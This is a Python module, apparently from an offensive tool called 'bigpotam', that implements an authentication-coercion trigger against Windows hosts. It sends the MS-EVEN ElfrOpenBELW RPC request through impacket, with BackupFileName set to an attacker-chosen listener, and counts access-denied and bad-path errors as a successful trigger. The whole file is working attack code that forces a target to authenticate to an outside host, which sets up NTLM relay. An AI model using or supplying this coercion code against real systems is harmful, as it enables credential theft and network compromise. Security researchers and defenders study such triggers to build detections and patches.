"""MS-EVEN trigger function."""

import logging

from impacket.dcerpc.v5 import even
from impacket.dcerpc.v5.dtypes import NULL

from bigpotam.methods import check_error
from bigpotam.paths import even_path

log = logging.getLogger("bigpotam")

# ERROR_BAD_NETPATH=0x35, STATUS_ACCESS_DENIED=0xC0000022, STATUS_OBJECT_PATH_NOT_FOUND=0xC000003A
_SUCCESS_CODES = {0x00000035, 0xC0000022, 0xC000003A}
_SUCCESS_STRINGS = (
    "ERROR_BAD_NETPATH",
    "STATUS_ACCESS_DENIED",
    "STATUS_OBJECT_PATH_NOT_FOUND",
    "STATUS_CONNECTION_DISCONNECTED",
)


def _check_success(e):
    return check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS)


def trigger_elfr_open_belw(dce, listener, listener_port=445, **kw):
    """ElfrOpenBELW (opnum 9). UNCServerName stays NULL, matching impacket's own working
    test (tests/dcerpc/test_even.py). The earlier attempt to give it a real value, plus a
    trailing NUL on BackupFileName, caused STATUS_INVALID_PARAMETER then rpc_x_bad_stub_data,
    both wrong: this call only needs BackupFileName, and that field can't have an embedded NUL."""
    try:
        request = even.ElfrOpenBELW()
        request["UNCServerName"] = NULL
        request["BackupFileName"] = even_path(listener, listener_port)
        request["MajorVersion"] = 1
        request["MinorVersion"] = 1
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("ElfrOpenBELW: %s", e)
        return False
